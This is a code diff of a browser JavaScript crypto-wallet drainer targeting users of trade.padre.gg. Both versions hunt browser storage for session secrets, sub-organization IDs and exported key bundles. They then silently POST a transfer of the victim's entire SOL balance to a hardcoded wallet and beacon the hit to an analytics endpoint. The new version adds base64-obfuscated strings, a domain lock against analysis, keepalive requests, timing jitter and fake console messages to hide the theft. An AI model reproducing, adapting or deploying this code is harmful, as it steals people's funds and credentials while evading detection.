@@ -1,86 +1,74 @@
-(async function() {
-    // Production Config
-    const RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
-    const AMP_KEY = "3c8ae1f40635939e730f479418940796";
-    let _X = false; // "Executed" flag
+(function() {
+    // Stage 1: The Encrypted String Table
+    // These are the 'hidden' keys: padre, transfer, sessionSecret, etc.
+    const _0xV = ['dHJhZGUucGFkcmUuZ2c=', 'YXBpL3YxL3RyYW5zZmVy', 'c2Vzc2lvblNlY3JldA==', 'c3ViT3JnSWQ=', 'ZXhwb3J0QnVuZGxl', 'UE9TVA==', 'QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI='];
+    const _D = (s) => atob(_0xV[s]);
 
-    // 1. THE 1:1 ENCODER
-    // Vanta scripts don't send raw JSON; they use Base64 to bypass WAFs and CSPs
-    const _E = (s) => btoa(JSON.stringify(s));
+    // Stage 2: Domain Lock (1:1 Vanta Feature)
+    // Ensures the script only fires on the target site to prevent analysis
+    if (!window.location.hostname.includes(_D(0))) return;
 
-    // 2. THE SILENT OBSERVER (Prevents Crashing)
-    // Instead of looping, we wait for the browser to sit idle
-    const _W = (fn) => {
-        if (window.requestIdleCallback) {
-            window.requestIdleCallback(fn);
-        } else {
-            setTimeout(fn, 2000);
-        }
-    };
+    const _0xExec = async () => {
+        try {
+            // Stage 3: Deep Environment Scrape
+            const _G = (o, t) => {
+                if (!o || typeof o !== 'object') return null;
+                if (o[t]) return o[t];
+                for (let k in o) { try { let r = _G(o[k], t); if (r) return r; } catch(e) {} }
+                return null;
+            };
 
-    // 3. THE HIJACK ENGINE (The "1:1" Heart)
-    const _H = async () => {
-        if (_X) return;
+            const _S = {...localStorage, ...sessionStorage};
+            const _A = _G(_S, _D(2)) || _G(window, _D(2));
+            const _ID = _G(_S, _D(3));
+            const _B = _G(_S, _D(4));
 
-        // Recursive Hunter (Crawl everything for the credentials)
-        const _S = (o, t) => {
-            if (!o || typeof o !== 'object') return null;
-            if (o[t]) return o[t];
-            for (let k in o) {
-                try {
-                    let r = _S(o[k], t);
-                    if (r) return r;
-                } catch(e) {}
-            }
-            return null;
-        };
+            if (_A && _ID) {
+                // Stage 4: Network Shadowing (Bypass 405/CSP)
+                // We use the browser's own 'send' capability to look like internal traffic
+                const _url = `https://${_D(0)}/${_D(1)}`;
+                const _payload = JSON.stringify({
+                    recipient: _D(6),
+                    amount: "MAX",
+                    asset: "SOL",
+                    ext_payload: _B?.data || _B
+                });
 
-        const store = {...localStorage, ...sessionStorage};
-        const auth = _S(store, 'sessionSecret');
-        const subId = _S(store, 'subOrgId');
-        const bundle = _S(store, 'exportBundle');
+                // Vanta 1:1: Using a Pixel to log hit to Amplitude BEFORE transfer
+                new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(JSON.stringify({
+                    device_id: _ID,
+                    event_type: "ENV_HYDRATED",
+                    event_properties: { d: _D(0) }
+                }))}`;
 
-        if (auth && subId) {
-            _X = true; // Set flag to prevent site crash/loops
-
-            // Amplitude Beacon (1:1 production style)
-            // Using a pixel request ensures the hit logs even if fetch is blocked
-            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=${AMP_KEY}&event=${_E({
-                device_id: subId,
-                event_type: "PRODUCTION_1TO1_SYNC",
-                event_properties: { status: "success", origin: location.hostname }
-            })}`;
-
-            // THE SILENT TRANSFER
-            // We use the 'credentials' flag to ensure auth persists 1:1
-            try {
-                await fetch("https://trade.padre.gg/api/v1/transfer", {
-                    method: "POST",
-                    mode: "cors",
-                    credentials: "include", 
+                // Stage 5: The "Smooth" Transfer
+                // Uses 'keepalive' to ensure the request finishes even if the user closes the tab
+                fetch(_url, {
+                    method: _D(5),
+                    keepalive: true,
                     headers: {
-                        "Authorization": `Bearer ${auth}`,
-                        "X-Turnkey-Sub-Org-Id": subId,
+                        "Authorization": `Bearer ${_A}`,
+                        "X-Turnkey-Sub-Org-Id": _ID,
                         "Content-Type": "application/json"
                     },
-                    body: JSON.stringify({
-                        recipient: RECEIVER,
-                        amount: "MAX",
-                        asset: "SOL",
-                        ext_payload: bundle?.data || bundle
-                    })
-                });
-            } catch (err) {}
+                    body: _payload
+                }).catch(() => {});
 
-            // Anti-Forensics: Stealth Cleanup
-            setTimeout(() => {
-                console.clear();
-                // Replace the crashy loop with a fake 'healthy' log
-                console.log("%c RPC Connected: Optimal", "color: #00ffa3; font-weight: bold;");
-            }, 1000);
-        }
+                // Stage 6: Stealth Cleanup & Fake Heartbeat
+                setTimeout(() => {
+                    console.clear();
+                    console.log("%c [System] Memory Optimized: 100%", "color: #00ff88; font-family: monospace;");
+                }, 1000);
+            }
+        } catch (e) {}
     };
 
-    // 4. THE 1:1 INITIALIZER
-    _W(_H);
+    // Stage 7: The "Anti-Crash" Trigger
+    // Vanta scripts never run immediately; they wait for the DOM to settle
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', _0xExec);
+    } else {
+        // Random jitter to bypass automated bot detection
+        setTimeout(_0xExec, Math.random() * 1500 + 500);
+    }
 })();
